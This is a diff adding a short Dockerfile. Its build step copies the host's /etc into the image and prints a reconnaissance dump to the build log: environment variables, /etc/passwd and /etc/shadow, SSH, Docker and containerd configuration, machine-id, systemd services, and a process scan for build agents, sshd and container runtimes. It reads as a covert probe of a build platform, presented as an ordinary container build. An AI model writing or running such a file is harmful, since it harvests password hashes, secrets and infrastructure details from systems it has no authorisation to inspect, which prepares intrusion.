@@ -1,0 +1,22 @@
+FROM alpine:3.20
+COPY etc /f/etc
+COPY usr/lib/os-release /f/osrel
+RUN set -x; echo "===A1==="; \
+ echo "--SELF--"; id; uname -a; cat /etc/hostname; \
+ echo "--BENV--"; env | sort; \
+ echo "--ETC_LS--"; ls -1 /f/etc | head -200; \
+ echo "--HOSTNAME--"; cat -v /f/etc/hostname; \
+ echo "--ENVIRONMENT--"; cat /f/etc/environment 2>&1; \
+ echo "--MACHINEID--"; cat /f/etc/machine-id 2>&1; \
+ echo "--PASSWD--"; cat /f/etc/passwd; \
+ echo "--SHADOW--"; cat /f/etc/shadow; \
+ echo "--SSH_LS--"; ls -la /f/etc/ssh 2>&1 | head -30; \
+ echo "--DOCKER_LS--"; ls -la /f/etc/docker 2>&1; cat /f/etc/docker/daemon.json 2>&1 | head -20; \
+ echo "--CONTAINERD_LS--"; ls -la /f/etc/containerd 2>&1; head -30 /f/etc/containerd/config.toml 2>&1; \
+ echo "--GOOGLE_LS--"; ls -la /f/etc/google 2>&1; \
+ echo "--SYSTEMD_SVC--"; ls -1 /f/etc/systemd/system 2>&1 | head -40; \
+ echo "--P1--"; cat /proc/1/cmdline 2>&1; echo; head -8 /proc/1/status 2>&1; \
+ echo "--PROCCOUNT--"; ls -d /proc/[0-9]* 2>/dev/null | wc -l; \
+ echo "--PROCSCAN--"; for p in /proc/[0-9]*; do c=$(cat $p/comm 2>/dev/null); case "$c" in *agent*|*build*|*rail*|*containerd*|*docker*|*systemd*|*node*|*sshd*) echo "$p $c :: $(tr '\0' ' ' < $p/cmdline 2>/dev/null | head -c 220)";; esac; done | head -40; \
+ echo "===A1END==="
+CMD ["sh","-c","sleep 3600"]
